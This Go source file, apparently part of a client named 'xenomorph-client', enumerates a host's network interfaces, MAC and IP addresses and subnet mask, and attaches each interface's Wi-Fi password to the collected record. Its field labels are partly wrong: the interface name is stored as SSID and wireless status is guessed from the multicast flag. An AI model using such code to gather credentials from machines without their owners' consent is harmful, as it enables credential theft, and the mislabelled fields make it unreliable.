package network

import (
	"fmt"
	"net"

	"github.com/codevault-llc/xenomorph-client/pkg/types"
)

func getNetworkInterfaces() ([]net.Interface, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}
	return interfaces, nil
}

// Retrieves the MAC address of the first network interface found.
func GetMacAddress() (string, error) {
	interfaces, err := getNetworkInterfaces()
	if err != nil {
		return "", fmt.Errorf("failed to get network interfaces: %w", err)
	}

	for _, iface := range interfaces {
		if len(iface.HardwareAddr) > 0 {
			return iface.HardwareAddr.String(), nil
		}
	}

	return "", fmt.Errorf("no MAC address found")
}

// GetDNSInfo retrieves the DNS information by looking up the IP addresses for a known domain.
func GetDNSInfo() ([]string, error) {
	addrs, err := net.LookupIP("google.com")
	if err != nil {
		return nil, fmt.Errorf("failed to lookup DNS: %w", err)
	}

	var ips []string
	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}

	if len(ips) == 0 {
		return nil, fmt.Errorf("no DNS information found")
	}

	return ips, nil
}

// GetSubnetMask retrieves the subnet mask of the first non-loopback network interface.
// It returns the mask in CIDR notation.
func GetSubnetMask() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", fmt.Errorf("failed to get subnet mask: %w", err)
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			mask := ipnet.Mask
			return mask.String(), nil
		}
	}

	return "", fmt.Errorf("no valid subnet mask found")
}

// Get network interfaces including their names, MAC addresses, and IP addresses and Password
func GetNetworkInterfaces() ([]types.NetworkInterface, error) {
	interfaces, err := getNetworkInterfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}

	var netInterfaces []types.NetworkInterface
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue // Skip down or loopback interfaces
		}

		ipAddrs, err := iface.Addrs()
		if err != nil {
			return nil, fmt.Errorf("failed to get addresses for interface %s: %w", iface.Name, err)
		}

		var ips []string
		for _, addr := range ipAddrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				ips = append(ips, ipnet.IP.String())
			}
		}

		password, err := GetWiFiPassword(iface.Name)
		if err != nil {
			return nil, fmt.Errorf("failed to get password for interface %s: %w",
				iface.Name, err)
		}

		netInterfaces = append(netInterfaces, types.NetworkInterface{
			SSID:    iface.Name,
			MACAddress:     iface.HardwareAddr.String(),
			IPAddresses:     ips,
			IsUp:    iface.Flags&net.FlagUp != 0,
			IsLoopback:  iface.Flags&net.FlagLoopback != 0,
			IsPointToPoint: iface.Flags&net.FlagPointToPoint != 0,
			IsWireless: iface.Flags&net.FlagMulticast != 0, // This is a heuristic; actual wireless check may require more specific checks
			Password: password,
		})
	}

	return netInterfaces, nil
}